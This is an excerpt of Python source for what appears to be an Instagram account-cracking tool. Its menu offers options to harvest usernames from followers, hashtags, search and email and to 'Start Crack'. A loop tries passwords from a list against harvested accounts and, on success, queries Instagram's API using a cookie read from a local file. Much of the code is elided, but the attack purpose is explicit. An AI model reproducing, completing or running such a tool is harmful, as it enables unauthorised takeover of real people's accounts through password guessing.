...
def ___menu___():
    ...
    print(f"{A}║ {A}[{J}2{A}]{A} Dump Username From {H}Followers          {J}║  {A}[{J}8{A}]{A} Dump User {H}From Email                  {A}║")
    print(f"{A}║ {A}[{J}3{A}]{A} Dump Username From {H}Activity           {J}║  {A}[{J}9{A}]{A} Start Crack {A}[{H}Fast{A}]{H}                    {A}║")
    print(f"{A}║ {A}[{J}4{A}]{A} Dump Username From {H}Home               {J}║  {A}[{J}0{A}]{A} List Total {A}Crack                      {A}║")
    print(f"{A}║ {A}[{J}5{A}]{A} Dump Username From {H}Hashtag            {J}║  {A}[{J}A{A}]{A} Log out {A}[{M}Exit{A}]{M}                        {A}║")
    print(f"{A}║ {A}[{J}6{A}]{A} Dump Username From {H}Search             {J}║                                           {A}║")
    print(f"{A}║                                           {J}║                                           {A}║")
    print(f"{A}╚════════════════════════════════════════════════════════════════════════════════════════╝")
            ...
            for pw in pwx:
                ...
                with requests.Session() as ses:
                    ...
                    if 'userId' in str(response):
                        try:
                            ___roz = requests.get(f'https://i.instagram.com/api/v1/{uid}/?__a=1', headers = {'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)', 'cookie': open('Data/coki.txt','r').read()}).json()['graphql']['user']
